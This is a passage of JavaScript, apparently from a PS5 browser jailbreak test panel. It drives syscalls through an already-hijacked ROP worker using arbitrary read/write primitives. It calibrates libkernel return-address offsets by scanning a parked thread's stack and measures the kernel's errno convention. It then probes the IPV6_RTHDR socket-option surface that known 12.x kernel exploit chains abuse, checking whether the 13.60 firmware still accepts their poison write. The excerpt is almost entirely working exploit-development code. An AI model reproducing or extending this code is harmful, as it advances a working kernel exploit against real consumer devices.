         * still held a pointer from an earlier call. */
        while (a.length < 6) a.push(0n);
        var t0 = Date.now();
        try {
            var ret = window.syscall(nr, a[0], a[1], a[2], a[3], a[4], a[5]);
            var d = decode(ret, expectFail);
            var ms = Date.now() - t0;
            /* quiet: the ABI sweep issues dozens of calls whose individual returns are
             * summarised into one row per argument; a throw is still ALWAYS reported. */
            if (!quiet)
                out(label, "ret=" + hex(ret) + " enc=" + d.enc
                    + (d.ok ? "" : " " + (d.errName || d.errno)) + "  (" + ms + "ms)",
                    d.ok ? "ok" : "err");
            return { label: label, nr: nr, ok: d.ok, errno: d.errno, errName: d.errName, ret: ret, ms: ms };
        } catch (e) {
            var why = String((e && e.message) || e).slice(0, 110);
            /* quiet stays quiet on throws too: settle() loops call this hundreds of times,
             * and 1300 identical THREW rows would flush the panel log buffer and evict the
             * tile output the operator is supposed to read. A quiet caller checks its own
             * last result if it cares. */
            if (!quiet) out(label, "THREW " + why, "err");
            return { label: label, nr: nr, threw: why, ok: false };
        }
    }

    function B(x) { return (typeof x === "bigint") ? x : BigInt(x); }
    /* settle(): sched_yield in a loop, SILENTLY. The AIO completion path and the waker
     * run on kernel worker threads; a JS thread that never yields can read the detectors
     * before the waker has run at all -- BragaTy/Wamphyre's bagagwa_uaf_1320.js yields
     * 200x after the shot, 500x after reclaim and 500x after the wake, and that timing
     * discipline is exactly what our 11:21 "no observable effect" run was missing. quiet
     * because 1300 S() rows would flush the panel log buffer and evict the tile output. */
    function settle(n) {
        for (var i = 0; i < n; i++) S("sched_yield", 0x14B, [], true, true);
    }
    function malloc(sz) { return B(window.malloc(sz)); }
    function zeros(ptr, n) {
        var z = new Uint8Array(n);
        if (window.write_buffer) window.write_buffer(B(ptr), z);
        return ptr;
    }

    /* ============================================ PROVEN payloads (one tap = proof)
     * The operator asked for REAL proof of progress, not text. Each button fires exactly
     * one already-proven capability, prints its evidence lines, and sends a PS5 toast
     * carrying the measured result -- what appears in the system notification is the
     * kernel's own answer, not our claim.
     *  pid = getpid's live value (T5's poison check proved the chain writes retval)
     *  fd  = an fd from kqueue, closed again (T2 proved the pair both runs)   */
    var PROVEN = {
        pid: function () {
            var r = S("getpid", 0x014, []);
            if (r.ret === undefined || B(r.ret) <= 0n) {
                out("PROOF-pid", "getpid did not answer: " + (r.threw || (r.errName || hex(r.ret))), "err");
                nres("pid proof FAILED", "PROOF");
                return false;
            }
            var pid = Number(BigInt.asIntN(64, B(r.ret)));
            out("PROOF-pid", "kernel answered getpid -> pid " + pid + " (executor round-trip PROVEN)", "ok");
            nres("pid=" + pid + " syscall exec PROVEN", "PROOF");
            chip(elVerdict, "ok", "pid proof: " + pid);
            return true;
        },
        fd: function () {
            var k = S("kqueue", 0x16A, []);
            if (k.ret === undefined || B(k.ret) <= 0n) {
                out("PROOF-fd", "kqueue did not answer: " + (k.threw || (k.errName || hex(k.ret))), "err");
                nres("fd proof FAILED", "PROOF");
                return false;
            }
            var fd = Number(B(k.ret));
            var c = S("close(fd)", 0x006, [B(k.ret)]);
            var closed = c.ret !== undefined && B(c.ret) === 0n;
            out("PROOF-fd", "kernel allocated fd " + fd + ", close() -> " + (closed ? "0 (real descriptor PROVEN)" : hex(c.ret === undefined ? 0n : c.ret)), closed ? "ok" : "warn");
            nres("fd=" + fd + " " + (closed ? "open+close PROVEN" : "close=" + hex(c.ret)), "PROOF");
            chip(elVerdict, closed ? "ok" : "bad", "fd proof: " + fd);
            return closed;
        },
        notify: function () {
            /* The proof IS the toast: if this fires, the operator is reading the result
             * inside the PS5's own notification system right now. ret 0 = delivered. */
            var okd = notify("PROOF: userland syscalls LIVE on " + FW);
            if (okd) {
                out("PROOF-notify", "toast DELIVERED -- ret 0 via route " + notifyRoute
                    + (notifyRoute === 1 ? " (libkernel sceKernelSendNotificationRequest, GoldHEN shape 0/req/0xC30/0)"
                        : " (syscall 0x2CA)") + "; msg@+0x2D in a 0xC30 zeroed request", "ok");
                chip(elVerdict, "ok", "notify delivered");
            } else {
                out("PROOF-notify", "toast NOT delivered -- read the NOTIFY FAILED row for the kernel's answer", "err");
                chip(elVerdict, "bad", "notify failed");
            }
            return okd;
        },
        osem: function () {
            var name = zeros(malloc(0x20), 0x20);
            var nb = new Uint8Array(9); var tag = "PROOFosem";
            for (var i = 0; i < 8; i++) nb[i] = tag.charCodeAt(i); nb[8] = 0;
            window.write_buffer(name, nb);
            var cr = S("osem_create(name,0,1,1,0)", 0x225, [name, 0n, 1n, 1n, 0n]);
            if (cr.ret === undefined || B(cr.ret) < 0x80n) {
                out("PROOF-osem", "create refused: " + (cr.threw || (cr.errName || hex(cr.ret))) + " -- T4 has the full shape ladder", "err");
                nres("osem create refused", "PROOF");
                return false;
            }
            var h = B(cr.ret);
            var d = S("osem_delete(h)", 0x227, [h], true);
            var okd = d.ret !== undefined && B(d.ret) === 0n;
            out("PROOF-osem", "kernel object handle " + hex(h) + ", osem_delete -> " + (okd ? "0 (REAL KERNEL ALLOCATION PROVEN, 128-zone)" : (d.errName || hex(d.ret))), okd ? "ok" : "warn");
            nres("osem h=" + hex(h) + (okd ? " delete==0 PROVEN" : " delete=" + hex(d.ret)), "PROOF");
            chip(elVerdict, okd ? "ok" : "bad", "osem proof: " + hex(h));
            return okd;
        },
        aio: function () {
            var r = S("aio_multi_wait(all-zero)", 0x297, [0n, 0n, 0n, 0n, 0n], true);
            var reach = r.ret !== undefined && B(r.ret) === 0x16n;
            out("PROOF-aio", reach
                ? "aio_multi_wait answered 0x16 EINVAL -- the syscall EXISTS on " + FW + " (a patched kernel would read 0x4e ENOSYS)"
                : "aio_multi_wait answered " + (r.threw || (r.errName || hex(r.ret === undefined ? 0n : r.ret))) + " -- NOT the expected EINVAL", reach ? "ok" : "warn");
            nres(reach ? "AIO reachable (EINVAL) PROVEN" : "AIO " + (r.errName || "?"), "PROOF");
            chip(elVerdict, reach ? "ok" : "bad", reach ? "AIO reachable" : "AIO odd");
            return reach;
        }
    };

    /* slot_expect calibration.
     *
     * The 13.60 LK row's four text RVAs are EXTRAPOLATED (p2jb_lk.js group C), and the
     * first console run proved slot_expect wrong: every call died in resolveSlot() with
     * "parked slot (kbase+0x1983b) not found". Signature-scanning libkernel TEXT on the
     * console is not possible -- the adapter documents that the libraries are xotext, so
     * reading code through the R/W primitive faults and kills the process.
     *
     * But the parked worker STACK is readable data, and the parked frame contains the
     * real return address INTO libkernel: exactly the qword resolveSlot() was scanning
     * for. value - kbase IS the true slot_expect. And the other three text RVAs follow
     * it at fixed deltas that are identical in both 12.x groups
     *     12.00: sw-slot=+0x162C  setjmp-slot=+0x3BB8  longjmp-slot=+0x3C11
     *     12.40: sw-slot=+0x162C  setjmp-slot=+0x3BB8  longjmp-slot=+0x3C11
     * so one measured value calibrates the whole row. thread_list=0x6c218 needs no
     * calibration -- find_worker() already succeeded on hardware with it.
     *
     * The executor holds the P2JB_LK row BY REFERENCE (p2jb_poops.js passes lk: row),
     * so mutating the row's properties reaches W.lk live -- no re-init needed, and the
     * next fireSync() picks the corrected values up.
     *
     * This tile writes NOTHING outside this JS process: every console touch is read64.
     * The risk arrives with the NEXT tile (a derived syscall_wrapper/setjmp/longjmp that
     * is wrong kills the WebProcess -- recoverable tab), which is why Identity must be
     * the verdict, and why the measured row is persisted so a crash is attributable.
     */
    var CALIBKEY = "bwslop_lk_" + FW;
    /* BigInt literals: they are ADDED to the measured slot_expect, and BigInt + number throws. */
    var DELTAS = { syscall_wrapper: 0x162Cn, setjmp: 0x3BB8n, longjmp: 0x3C11n };

    /* The cond_wait-resume return address resolveSlot() fingerprints, derived for
     * 13.60 statically: 12.00's 0x197FB + the verified +0x90 stub shift (EVERY
     * syscall stub moved exactly +0x90 between 12.00 and 13.60 -- see p2jb_lk.js).
     * Hardware-confirmed 2026-09: found frame-validated in the parked worker
     * stack top at stack+0x7fc28 (12.00 parks at 0x7fc18). */
    var KNOWN = { slot_expect: 0x1988Bn };

    function loadCalib() {
        try { var s = localStorage.getItem(CALIBKEY); return s ? JSON.parse(s) : null; } catch (e) { return null; }
    }
    function saveCalib(row) {
        /* BigInt does not JSON-serialise -- store RVAs as strings. */
        try { localStorage.setItem(CALIBKEY, JSON.stringify(row, function (k, v) { return typeof v === "bigint" ? v.toString() : v; })); } catch (e) { }
    }
    function applyCalib(row) {
        var target = (window.P2JB_LK && window.P2JB_LK[FW]) || null;
        if (!target) throw new Error("no P2JB_LK row to patch");
        target.slot_expect = BigInt(row.slot_expect);
        target.syscall_wrapper = BigInt(row.syscall_wrapper);
        target.setjmp = BigInt(row.setjmp);
        target.longjmp = BigInt(row.longjmp);
        return target;
    }

    /* Read-only. Walks the same top-0x8000 window resolveSlot() scans, high->low, and
     * collects every qword that points into libkernel text. WebKit return addresses
     * (the WTF::Condition wrapper frames ABOVE the parked frame) are excluded by range,
     * and each libkernel candidate is frame-validated the same way resolveSlot()
     * validates: cond_wait's callee pushes rbp first, so the qword at candidate-8 must
     * be a stack address above the candidate and inside this stack. */
    function scanStackForKernelPtrs() {
        var st = window.rop_worker.state;
        if (!st.stack && window.rop_worker.findWorkerStack) {
            try { var f = window.rop_worker.findWorkerStack(); if (f && f.stack) st.stack = f.stack; } catch (e) { }
        }
        if (!st.stack || !st.kbase) throw new Error("stack/kbase not resolved -- userland half incomplete");
        var stack = B(st.stack), kbase = B(st.kbase);
        var wbase = st.wbase ? B(st.wbase) : 0n;
        var top = stack + 0x80000n, lo = top - 0x8000n;
        var hits = [];
        for (var a = top - 8n; a >= lo; a -= 8n) {
            var v;
            try { v = B(window.read64(a)); } catch (e) { continue; }
            if (v < kbase + 0x1000n || v >= kbase + 0x200000n) continue;   // libkernel text only
            if (wbase && v >= wbase && v < wbase + 0x8000000n) continue;   // not webkit frames
            var rec = { addr: a, rva: v - kbase, validated: false, savedRbp: 0n };
            try {
                var rbp = B(window.read64(a - 8n));
                if (rbp > a && rbp < top && (rbp & 7n) === 0n) { rec.validated = true; rec.savedRbp = rbp; }
            } catch (e) { }
            hits.push(rec);
        }
        return hits;
    }

    function pCalibrate() {
        var st = (window.rop_worker && window.rop_worker.state) || null;
        if (!st) { out("CAL-VERDICT", "rop_worker.state not reachable", "err"); return { ok: false, summary: "no state" }; }

        /* Already working? Then the row was right and this is a no-op. */
        if (st.slot && st.fired > 0) {
            out("CAL-VERDICT", "executor already resolved its slot (slot=" + hex(B(st.slot))
                + ") -- nothing to calibrate", "ok");
            return { ok: true, summary: "already resolved" };
        }

        var t0 = Date.now();
        var hits = scanStackForKernelPtrs();
        out("CAL-SCAN", hits.length + " libkernel text pointer(s) in the worker stack top ("
            + (Date.now() - t0) + "ms)", "dim");
        if (!hits.length) {
            /* Fall back to a previously measured row, if one survived in localStorage. */
            var saved = loadCalib();
            if (saved) {
                try {
                    applyCalib(saved);
                    out("CAL-VERDICT", "scan found nothing; re-applied the persisted row (slot_expect="
                        + hex(BigInt(saved.slot_expect)) + (saved.verified ? ", anchor-verified" : ", NOT anchor-verified -- re-run Calibrate when the worker is parked")
                        + ", measured " + new Date(saved.ts).toISOString() + ")", saved.verified ? "warn" : "err");
                    return { ok: true, summary: "restored " + hex(BigInt(saved.slot_expect)) };
                } catch (e) { out("CAL-VERDICT", "persisted row unusable: " + String((e && e.message) || e).slice(0, 60), "warn"); }
            }
            out("CAL-VERDICT", "no candidate found -- worker not parked where expected; nothing measured", "err");
            return { ok: false, summary: "no candidates" };
        }
        /* Collapse repeats first: the same libkernel RVA on many stack words is a DATA
         * constant copied into frames, not a return address -- on the first hardware
         * run 25 of 38 hits were __stack_chk_guard (libkernel+0x751d0). One line per
         * RVA; data words (count >= 3) never win the pick. */
        var byRva = {};
        for (var j = 0; j < hits.length; j++) {
            var key = hits[j].rva.toString(16);
            var g = byRva[key] || (byRva[key] = { rva: hits[j].rva, count: 0, best: null });
            g.count++;
            if (!g.best || (hits[j].validated && !g.best.validated)) g.best = hits[j];
        }
        var groups = [];
        for (var key2 in byRva) groups.push(byRva[key2]);
        groups.sort(function (a, b) { return Number(b.best.addr - a.best.addr); });
        for (var i = 0; i < groups.length; i++) {
            var gr = groups[i], data = gr.count >= 3;
            out("CAL-CAND", "stack+" + hex(gr.best.addr - B(st.stack)) + " -> libkernel+" + hex(gr.rva)
                + (data ? "  [x" + gr.count + " -- repeated data word, excluded]"
                : (gr.best.validated ? "  [live frame: saved rbp=stack+" + hex(gr.best.savedRbp - B(st.stack)) + "]"
                                     : "  [no frame validation]")),
                data ? "dim" : (gr.best.validated ? "ok" : "warn"));
            if (data) { groups.splice(i, 1); i--; }
        }

        /* Priority: (1) the statically derived anchor -- the cond_wait-resume return
         * resolveSlot() itself fingerprints. (2) highest frame-validated return
         * address. (3) highest raw hit, explicitly labelled a guess. Rule (1) exists
         * because of the first hardware run: the highest live frame was the
         * thread-ENTRY trampoline (libkernel+0x2198d, also frame-valid), not the
         * parked frame. */
        var pick = null, verified = false;
        for (var k = 0; k < groups.length; k++)
            if (groups[k].rva === KNOWN.slot_expect) { pick = groups[k].best; verified = true; break; }
        if (!pick) for (var k2 = 0; k2 < groups.length; k2++) if (groups[k2].best.validated) { pick = groups[k2].best; break; }
        if (!pick && groups.length) pick = groups[0].best;
        if (!pick) {
            out("CAL-VERDICT", "every candidate was a repeated data word -- nothing usable to pick", "err");
            return { ok: false, summary: "no candidates" };
        }
        if (!verified)
            out("CAL-VERDICT", "anchor libkernel+0x" + KNOWN.slot_expect.toString(16)
                + " NOT on the stack -- picked " + hex(pick.rva) + " by frame/range rules; treat as unverified", "warn");

        var slotExpect = pick.rva;
        var row = {
            slot_expect: slotExpect,
            syscall_wrapper: slotExpect + DELTAS.syscall_wrapper,
            setjmp: slotExpect + DELTAS.setjmp,
            longjmp: slotExpect + DELTAS.longjmp,
            ts: Date.now(),
            via: verified ? "anchor-0x1988b" : (pick.validated ? "stack-scan+rbp" : "stack-scan"),
            candidates: hits.length,
            verified: verified,
        };
        try { applyCalib(row); } catch (e) {
            out("CAL-VERDICT", "measured but could not apply: " + String((e && e.message) || e).slice(0, 70), "err");
            return { ok: false, summary: "apply failed" };
        }
        saveCalib(row);
        var guess = 0x1983Bn;   /* BigInt: a plain Number here threw on hardware (BigInt mix) */
        var diff = slotExpect >= guess ? slotExpect - guess : guess - slotExpect;
        out("CAL-MEASURED", "slot_expect=" + hex(slotExpect)
            + "  (the extrapolated guess " + hex(guess) + " was off by "
            + (slotExpect >= guess ? "+" : "-") + hex(diff) + ")", "ok");
        out("CAL-DERIVED", "syscall_wrapper=" + hex(BigInt(row.syscall_wrapper)) + " setjmp=" + hex(BigInt(row.setjmp))
            + " longjmp=" + hex(BigInt(row.longjmp)) + "  (fixed 12.x-group deltas)", "dim");
        out("CAL-VERDICT", "row patched live; thread_list stays 0x6c218 (hardware-verified). "
            + "Run Identity now: a plausible getpid PROVES the calibrated row.", "ok");
        chip(elVerdict, "", "slot_expect " + hex(BigInt(slotExpect)));
        notify("bagagwa: slot_expect measured " + hex(BigInt(slotExpect)) + " on " + FW);
        return { ok: true, summary: "slot_expect " + hex(BigInt(slotExpect)) };
    }

    /* T0 -- which error convention does syscall_wrapper use? MEASURED, not assumed.
     *
     * Every errno-shaped verdict in this panel is read through this answer, and getting it
     * wrong in one direction is catastrophic: a patched aio_multi_wait returns ENOSYS
     * (0x4e), and a decoder that only understands the -errno shape reports 0x4e as a small
     * positive SUCCESS -- i.e. "the chain is alive" on the one firmware where it is dead.
     *
     * HARDWARE LESSON (13.60, 2026-09-16): this tile originally ended with an out-of-range
     * syscall number (0x7FF) expecting ENOSYS. The kernel did NOT return ENOSYS -- it
     * stopped answering altogether: the third call spun out fireSync's full cap (~64 s of
     * freeze) and the page had to be reloaded. Three runs died at exactly that call. So the
     * rule is now: CALL ONLY NUMBERS PROVEN TO EXIST on this firmware, and PROVE the kernel
     * is still alive after every call that can behave unexpectedly.
     *
     * The measurement therefore uses ONE failing call to a native stub plus a canary:
     *   close(0x7fffffff)   native stub (0x006 IS in the 13.60 map). MUST fail EBADF --
     *                       whatever rax holds IS the error form:
     *                       raw => 0x9   converted => -9   plain -1 => all-ones
     *   getpid (canary)     native stub (0x014). MUST still answer afterwards. If it does
     *                       not, the failing call wedged the kernel and NOTHING may be
     *                       concluded.
     * The ENOSYS encoding is then INFERRED from the measured convention (the kernel has one
     * syscall return path), and the verdict says "inferred" rather than claiming it was
     * measured -- because the only direct way to measure it cost a freeze. */
    function pConvention() {
        var ctl = S("getpid (control)", 0x014, []);
        if (ctl.threw) {
            out("T0-VERDICT", "getpid itself did not answer (" + ctl.threw + ") -- the executor is "
                + "not running, so there is nothing to measure. Run Calibrate LK row first.", "warn");
            return { ok: false, summary: "no executor" };
        }
        /* Cannot succeed, so its return is labelled an errno even though the convention is
         * not yet known -- that is the whole basis of the test. Native stub, in-map number. */
        var bad = S("close(0x7fffffff) -- must fail EBADF", 0x006, [0x7FFFFFFFn], true);
        if (bad.threw) {
            out("T0-VERDICT", "close() threw AFTER getpid answered (" + bad.threw + "). If RW-WEDGE "
                + "beacons name a shape, the KERNEL stopped answering mid-tile. Convention "
                + "UNMEASURED; every errno-shaped verdict below is UNVERIFIED.", "err");
            return { ok: false, summary: "wedged mid-tile" };
        }
        /* The canary is the tile's tripwire: it distinguishes "the kernel answered and
         * returned an errno" from "the kernel never came back" -- without it the two look
         * identical, because both leave a small value in rax. */
        var ctl2 = S("getpid (canary)", 0x014, []);
        if (ctl2.threw || B(ctl2.ret) === 0n) {
            out("T0-VERDICT", "WEDGE: the canary getpid after close() did not return a value -- the "
                + "failing call stopped the kernel from answering (spin cap elapsed; RW-WEDGE "
                + "beacons have the shape). Convention UNMEASURED, every verdict UNVERIFIED. "
                + "Reload. This tile calls only numbers that are proven native stubs -- which "
                + "is why the damage stopped at one call instead of poisoning the whole run.", "err");
            notify("bagagwa T0: kernel wedge after close() -- reload required");
            return { ok: false, summary: "kernel wedge" };
        }

        var br = B(bad.ret);
        function U(x) { return BigInt.asUintN(64, x); }

        if (br === 0x9n) CONV = "raw";
        else if (br === U(-9n)) CONV = "converted";
        else if (br === 0xFFFFFFFFFFFFFFFFn) CONV = "minus1";

        var enosysShape = (CONV === "raw") ? "0x4e (inferred)"
            : (CONV === "converted") ? "-78 (inferred)"
                : "unreadable (the errno lives outside rax)";

        if (CONV === "raw") {
            out("T0-VERDICT", "RAW errno convention, measured via close(bad fd)=" + hex(br)
                + " (EBADF) with a live canary after it. syscall_wrapper is a bare syscall;ret, so "
                + "the kernel's errno lands in rax with no -1 conversion. ENOSYS on this kernel "
                + "therefore reads " + enosysShape + " -- inferred from the convention (one syscall "
                + "return path), NOT measured, because the direct way to measure it cost a freeze. "
                + "T3's ENOSYS test is valid, and a PATCHED aio_multi_wait would read 0x4e.", "ok");
            notify("bagagwa T0 raw errno convention; ENOSYS=0x4e (inferred)");
            return { ok: true, summary: "raw (ENOSYS=0x4e inferred)" };
        }
        if (CONV === "converted") {
            out("T0-VERDICT", "CONVERTED convention: close(bad fd) returned " + hex(br)
                + " (-errno in rax), canary alive. T3's -errno decode is valid as written -- and "
                + "the corollary is that an AIO refusal must then read " + hex(U(-22n)) + " (-EINVAL), "
                + "NOT a small positive value. ENOSYS would read " + enosysShape + ".", "ok");
            notify("bagagwa T0 converted errno convention on " + FW);
            return { ok: true, summary: "converted" };
        }
        if (CONV === "minus1") {
            out("T0-VERDICT", "PLAIN -1 convention: close(bad fd) returned 0xFFFFFFFFFFFFFFFF and the "
                + "errno is kept ELSEWHERE (a libc/thread errno slot), canary alive. The errno NUMBER "
                + "is not recoverable from rax, so this panel CANNOT distinguish ENOSYS from a "
                + "legitimate small return -- read the RAW returns on T3, do not trust an ENOSYS "
                + "verdict.", "err");
            notify("bagagwa T0: -1 with errno elsewhere on " + FW + " -- ENOSYS unreadable");
            return { ok: false, summary: "minus1" };
        }
        out("T0-VERDICT", "UNEXPECTED: close(0x7fffffff) returned " + hex(br) + " with a live canary "
            + "-- neither convention fits. Treat every errno-shaped verdict below as unverified.", "warn");
        return { ok: false, summary: "unknown" };
    }

    /* T1 -- the identity family. p2jb's own preflight uses exactly this set to prove the
     * libkernel call path, and it is the cheapest positive control there is: if these come
     * back with plausible values then the chain, the base derivation and the worker hijack
     * are all working, and every later failure is a firmware fact rather than a bug. */
    function pIdentity() {
        var r = [
            S("getpid", 0x014, []),
            S("getppid", 0x027, []),
            S("getuid", 0x018, []),
            S("geteuid", 0x019, []),
            S("getgid", 0x02F, []),
            S("getegid", 0x02B, []),
        ];
        var ok = r.filter(function (x) { return x.ok; }).length;
        notify("bagagwa T1 identity " + ok + "/6" + (r[0].ok ? " pid=" + hex(r[0].ret) : ""));
        if (ok === 0) {
            out("T1-VERDICT", "no call returned -- if RW-SLOT beacons said 'not found', run Calibrate LK row, then Identity again", "err");
            return { ok: false, summary: "0/6" };
        }
        out("T1-VERDICT", ok + "/6 answered. uid=" + hex(r[2].ret) + " (0 or 1 at browser privilege, NOT 0x3ff)", "ok");
        return { ok: ok === 6, summary: ok + "/6" };
    }

    /* T2 -- the two descriptor-returning calls that matter downstream. kqueue is what
     * p2jb's stage-4 reclaim path sprays, and pipe2 is what the Bagagwa chain builds its
     * waker pipe from. Both are closed again: an fd left open costs a slot, and an
     * unclosed kqueue costs an RLIMIT_KQUEUES slot, which is the very limit p2jb's cr_ref
     * leak is gated on. */
    function pResources() {
        var ok = 0, total = 0;

        var kq = S("kqueue", 0x16A, []);
        total++;
        if (kq.ret !== undefined && kq.ok) {
            var fd = Number(BigInt.asIntN(32, kq.ret));
            /* PROVE it is a descriptor before counting it. Under a raw errno convention a
             * FAILED kqueue also looks like a small positive number (EMFILE = 24, EMFILE is
             * exactly what this call runs into when p2jb's kqueue leak has drained the
             * limit), and close() is the definitive test: it returns 0 only for a descriptor
             * that really exists. Counting 24 as "a real fd" and closing it would spend a
             * slot on nothing and turn a failure into a green line. */
            var cl = (fd >= 0) ? S("close(kqueue)", 0x006, [BigInt(fd)]) : null;
            var kqReal = !!(cl && cl.ret !== undefined && B(cl.ret) === 0n);
            out("T2-kqueue", "fd=" + fd + (kqReal
                ? " -- proven a real descriptor (close returned 0), closed again"
                : " -- close() did NOT return 0, so " + hex(kq.ret) + " was an errno, not a descriptor"),
                kqReal ? "ok" : "warn");
            if (kqReal) ok++;
        }

        try {
            var pfd = zeros(malloc(8), 8);
            var pr = S("pipe2", 0x2AF, [pfd, 0n]);
            total++;
            /* pipe2 returns 0 on success, and 0 can never be an errno under ANY convention,
             * so this one needs no ambiguity handling -- but the fd PAIR it wrote does, so the
             * closes are checked the same way as kqueue's. */
            var pipeReal = (pr.ret !== undefined) && B(pr.ret) === 0n;
            if (pipeReal) {
                if (window.read_buffer) {
                    var buf = window.read_buffer(pfd, 8);
                    var rd = new Int32Array(buf.buffer, buf.byteOffset, 2);
                    var cr = S("close(pipe r)", 0x006, [BigInt(rd[0])]);
                    var cw = S("close(pipe w)", 0x006, [BigInt(rd[1])]);
                    var bothReal = (cr.ret !== undefined && B(cr.ret) === 0n)
                        && (cw.ret !== undefined && B(cw.ret) === 0n);
                    out("T2-pipe2", "rfd=" + rd[0] + " wfd=" + rd[1] + (bothReal
                        ? " -- both closes returned 0, the pair is genuine"
                        : " -- but a close() did not return 0; the fds may be stale"),
                        bothReal ? "ok" : "warn");
                    if (bothReal) ok++;
                } else {
                    ok++;
                }
            } else if (pr.ret !== undefined) {
                out("T2-pipe2", "refused: " + hex(pr.ret) + (pr.errName ? " (" + pr.errName + ")" : "")
                    + " -- pipe2 returns 0 on success", "warn");
            }
        } catch (e) {
            out("T2-pipe2", "THREW " + String((e && e.message) || e).slice(0, 90), "err");
        }

        notify("bagagwa T2 resources " + ok + "/" + total);
        return { ok: ok > 0, summary: ok + "/" + total };
    }

    /* T2c -- the P2JB / poops KERNEL-BUG syscall surface, called for real. Both patched
     * 12.00-12.70 chains drive the SAME primitives, and every number is a proven 13.60
     * stub; nothing here writes kernel memory:
     *   - socketpair(0x035) / socket(0x061): allocate the objects the bugs operate on
     *   - setsockopt(IPPROTO_IPV6=41, IPV6_RTHDR=51, tag, 0x38) (0x069): THE tag/poison
     *     write used by both chains; IPV6_FL_AUDIT=0x6d is the 13.x validator. PASS = the
     *     validator accepted the pair (that validator is what "patched" means).
     *   - getsockopt(IPV6_RTHDR) (0x06A): the READ side; PASS = echoes our own tag.
     *   - getrlimit(0x0C2): the helper both chains use to read fudge limits.
     * Closeable consequences only: every fd and every kq closes again. The kernel-memory
     * stages of those bugs (getsockopt(victim) rewriting ip6po_rthdr pointers) are NOT
     * reproducible on 13.60 if the validator refuses -- and if it accepts, THAT is the
     * headline result. Either way this tile measures, it never assumes. */
    function pKbugs() {
        try {
            var AF_INET6 = 28n, SOCK_STREAM = 1n, IPPROTO_IPV6 = 41n, IPV6_RTHDR = 51n,
                IPV6_FL_AUDIT = 0x6dn, SOL_SOCKET = 0xffffn, SO_REUSEADDR = 4n;
            var NPAIR = 2;
            var ipv6s = [], pairs = [], kq = -1;
            var clean = function () {
                for (var i = 0; i < ipv6s.length; i++) S("close(ipv6)", 0x006, [BigInt(ipv6s[i])]);
                for (var j = 0; j < pairs.length; j++) {
                    S("close(sp r)", 0x006, [BigInt(pairs[j][0])]);
                    S("close(sp w)", 0x006, [BigInt(pairs[j][1])]);
                }
                if (kq >= 0) S("close(kq)", 0x006, [BigInt(kq)]);
            };

            /* -- allocations -- */
            var so = S("socket(AF_INET6,SOCK_STREAM)", 0x061, [AF_INET6, SOCK_STREAM, 0n]);
            var socketOk = so.ret !== undefined && B(so.ret) >= 0n && B(so.ret) < 0x100n;
            if (!socketOk) {
                out("T2c-VERDICT", "socket(AF_INET6) refused (" + (so.errName || (so.ret === undefined ? so.threw : hex(so.ret)))
                    + ") -- the IPV6 socket layer the two chains drive is not reachable; nothing else in this tile can run", "warn");
                nres("no AF_INET6 socket", "T2c");
                return { ok: true, summary: "no socket" };
            }
            ipv6s.push(Number(B(so.ret)));
            out("T2c-socket", "fd=" + ipv6s[0] + " -- the object both 12.x kernel chains operate on", "ok");

            for (var pi = 0; pi < NPAIR; pi++) {
                var sf = zeros(malloc(0x10), 0x10);
                /* 0x087 = socketpair on PS5 (sys_socketpair in our own offset maps;
                 * 0x035 is sigtimedwait and answered EFAULT on hardware three runs running). */
                var spr = S("socketpair#" + pi, 0x087, [1n, 1n, 0n, sf]);
                if (spr.ret !== undefined && B(spr.ret) === 0n) {
                    var pr = new Int32Array(window.read_buffer(sf, 8).buffer, 0, 2);
                    pairs.push([pr[0], pr[1]]);
                    out("T2c-socketpair", "pair#" + pi + " r=" + pr[0] + " w=" + pr[1], "ok");
                } else {
                    out("T2c-socketpair", "pair#" + pi + " refused: " + (spr.errName || hex(spr.ret)), "dim");
                }
            }
            var kqr = S("kqueue", 0x16A, []);
            if (kqr.ret !== undefined && B(kqr.ret) >= 0n && B(kqr.ret) < 0x100n) kq = Number(B(kqr.ret));

            /* -- setsockopt(IPV6_RTHDR) with a 0x38 tag: PASS = the 13.x validator ACCEPTED it -- */
            var tag = zeros(malloc(0x40), 0x40);
            var tbytes = new Uint8Array(0x38);
            tbytes[0] = 0x38;                            /* ip6po_rthdr wants a valid cmhdr length */
            for (var ti = 1; ti < 8; ti++) tbytes[ti] = 0xC3;      /* tag 0xC3C3... first 8 bytes */
            window.write_buffer(tag, tbytes);
            var ss = S("setsockopt(IPV6_RTHDR,tag,0x38)", 0x069, [B(so.ret), IPPROTO_IPV6, IPV6_RTHDR, tag, 0x38n]);
            var ssOk = ss.ret !== undefined && B(ss.ret) === 0n;
            out("T2c-setsockopt", "setsockopt(IPV6_RTHDR) -> " + (ss.ret === undefined ? ss.threw : hex(ss.ret))
                + (ss.errName ? " (" + ss.errName + ")" : "")
                + (ssOk ? " -- validator ACCEPTED the pair: the poison-write primitive of both 12.x chains still goes through"
                        : " -- validator REFUSED the pair (this refusal IS the 13.x patch in action)"), ssOk ? "ok" : "dim");

            /* -- the differential: IPV6_FL_AUDIT validator -- */
            var audit = S("setsockopt(IPV6_FL_AUDIT)", 0x069, [B(so.ret), IPPROTO_IPV6, IPV6_FL_AUDIT, tag, 0x38n], true);
            out("T2c-audit", "IPV6_FL_AUDIT(0x6d) -> " + (audit.ret === undefined ? audit.threw : hex(audit.ret))
                + (audit.errName ? " (" + audit.errName + ")" : "")
                + " -- the 13.x rthdr validator; its behavior is what distinguishes patched from exploitable", "dim");

            /* -- getsockopt READ-BACK: does our own tag echo? -- */
            var rb = zeros(malloc(0x40), 0x40);
            var rblen = zeros(malloc(4), 4);
            window.write_buffer(rblen, new Uint8Array([0x40, 0, 0, 0]));
            var gs = S("getsockopt(IPV6_RTHDR)", 0x06A, [B(so.ret), IPPROTO_IPV6, IPV6_RTHDR, rb, rblen]);
            var gsOk = gs.ret !== undefined && B(gs.ret) === 0n;
            var echoed = false;
            if (gsOk) {
                var back = new Uint8Array(window.read_buffer(rb, 8));
                echoed = back[1] === 0xC3 && back[2] === 0xC3 && back[3] === 0xC3;
            }
            out("T2c-getsockopt", "getsockopt(IPV6_RTHDR) -> " + (gs.ret === undefined ? gs.threw : hex(gs.ret))
                + (gs.errName ? " (" + gs.errName + ")" : "")
                + (gsOk ? (echoed ? " -- our own tag ECHOED: kernel round-trips the rthdr option (read side of both chains works)"
                                  : " -- ok, but the buffer did not echo our tag: the option is kernel-generated, not stored verbatim")
                       : " -- refused; the read side is gated too"), gsOk ? "ok" : "dim");

            /* -- getsockopt(victim) ACROSS descriptors: the actual bug shape. On 12.x the
             *    master/victim pair let this cross and rewrite the victim's rthdr POINTER.
             *    Here it must fail cleanly (EINVAL/ENOENT) -- if it ever returns 0, that is
             *    the headline. Reads only; still safe. -- */
            var xbuf = zeros(malloc(0x40), 0x40);
